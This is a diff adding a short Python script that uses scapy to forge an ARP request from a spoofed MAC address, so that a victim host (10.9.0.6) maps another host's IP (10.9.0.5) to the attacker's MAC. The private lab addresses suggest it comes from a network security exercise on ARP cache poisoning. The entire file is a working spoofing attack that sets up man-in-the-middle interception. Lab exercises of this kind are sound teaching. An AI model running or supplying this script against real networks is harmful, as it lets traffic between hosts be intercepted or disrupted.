@@ -1,0 +1,25 @@
+#!/usr/bin/env python3
+from scapy.all import *
+
+# victim 
+target_ip = "10.9.0.6" 
+target_mac = "02:42:0a:09:00:06"
+
+spoofed_ip = "10.9.0.5"
+spoofed_mac="aa:bb:cc:dd:ee:ff"
+
+ether = Ether(dst=target_mac, src=spoofed_mac)
+
+# op = 1 - Request 
+# op = 2 - Reply
+
+arp = ARP(psrc=spoofed_ip, 
+  hwsrc=spoofed_mac, 
+  pdst=target_ip,
+  op=1)
+
+frame = ether/arp
+frame.show()
+
+# update the interface 
+sendp(frame, iface="eth0")
